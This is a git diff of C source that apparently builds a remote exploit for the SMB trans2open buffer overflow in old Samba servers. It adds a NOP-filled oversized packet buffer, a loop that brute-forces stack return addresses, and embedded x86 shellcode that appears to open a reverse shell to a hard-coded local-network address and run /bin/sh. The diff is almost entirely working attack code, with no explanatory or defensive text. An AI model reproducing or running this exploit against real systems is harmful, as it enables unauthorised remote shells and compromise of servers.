@@ -41,6 +41,7 @@ struct tree_connect {
 struct trans2_open2 {
   NBHDR nb;
   SMBHDR hdr;
+
   uint8_t wc;
   uint16_t tot_param_c;
   uint16_t tot_data_c;
@@ -60,6 +61,7 @@ struct trans2_open2 {
   uint8_t pad2;
   uint16_t setup;
 
+  uint16_t bc;
   uint8_t name;
   uint8_t pad[2];
 
@@ -71,7 +73,12 @@ struct trans2_open2 {
   uint16_t open_mode;
   uint32_t alloc_size;
   uint8_t reserved2[10];
-  uint8_t EX[2000];
+  uint8_t EX[4000];
+};
+
+struct ret_chain {
+  uint8_t jump[2];
+  uint32_t ret;
 };
 
 #pragma pack()
@@ -79,15 +86,9 @@ struct trans2_open2 {
 int nbss(int sock);
 int get_conn();
 
-int main() {
-  int sock = get_conn();
-  if (sock < 0) {
-    return -1;
-  };
-
-  // --------- NBSS -------------
-  // nbss(sock);
-  // sleep(1);
+int get_session(int sock) {
+  nbss(sock);
+  usleep(100000);
 
   // ----------------------- Negotiate ----------------------
 
@@ -141,8 +142,81 @@ int main() {
   send(sock, tree_conn, sizeof(tree_conn), 0);
   usleep(100000);
 
-  // ---------------------- create andx ------------------------
-}
+  return sock;
+};
+
+int main() {
+  uint8_t shellcode[] = "\x6a\x01\xfe\x0c\x24\x6a\x01\x6a\x02\x6a\x66\x58\x6a\x01\x5b\x89\xe1\xcd\x80\x89\xc2\x68\xc0\xa8\x01\x07\x68\x01"
+                        "\x01\x01\x01\x81\x34\x24\x03\x01\xeb\x60\x89\xe1\x6a\x10\x51\x52\x6a\x66\x58\x6a\x03\x5b\x89\xe1\xcd\x80\x89\xeb"
+                        "\x6a\x02\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01"
+                        "\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80";
+
+  // ----------------------- trans2 open2 ------------------------
+
+  uint8_t trans2open[sizeof(struct trans2_open2)] = {0};
+
+  struct trans2_open2 *open2 = (struct trans2_open2 *)trans2open;
+
+  open2->nb.len = htons(sizeof(trans2open) - 4);
+  memcpy(open2->hdr.proto, "\xffSMB", 4);
+  open2->hdr.command = 0x32;
+  open2->hdr.flag = 0x18;
+  open2->hdr.tid = 0x0001;
+  open2->hdr.uid = 0x0064;
+  open2->wc = 0x0f;
+  open2->tot_param_c = htole16(2031);
+  open2->max_param_c = 0xffff;
+  open2->max_data_c = 0xffff;
+  open2->max_setup_c = 0xff;
+  open2->param_c = htole16(2031);
+  open2->param_off = htole16((uint8_t *)&open2->data_flags - (uint8_t *)&open2->hdr);
+  open2->setup_c = 1;
+  //                           ---- ---- ---- --+-
+  open2->access_mode = htole32(0b0000000000000010);
+
+  memset(open2->EX, 0x90, 4000);
+
+  // Bruteforce logic
+
+  uint32_t start = 0xbffffb00;
+  uint32_t power = 50;
+  uint32_t finish = 0xbfffffff;
+
+  int offset = 0;
+  for (int i = offset; i < 4; i++) {
+
+    for (uint32_t ret = start; ret < finish; ret += power) {
+      printf("Trying: %08x & %d\n", ret, offset);
+
+      int sock = get_conn();
+      if (sock < 0) {
+        return -1;
+      };
+
+      get_session(sock);
+
+      struct ret_chain chain = {0};
+      chain.jump[0] = 0xeb;
+      chain.jump[1] = 0x04;
+
+      chain.ret = htonl(ret);
+
+      uint8_t *ret_block = open2->EX + offset;
+
+      for (int i = 0; i < 50; i += 6) {
+        memcpy(ret_block + i, &chain, 6);
+      };
+
+      uint8_t *shell_block = ret_block + 6 * 50;
+
+      memcpy(shell_block, shellcode, sizeof(shellcode));
+
+      send(sock, trans2open, sizeof(trans2open), 0);
+    };
+
+    offset++;
+  };
+};
 
 void nbios_htonb(uint8_t *in, uint8_t *out) {
   for (int i = 0; i < 16; i++) {
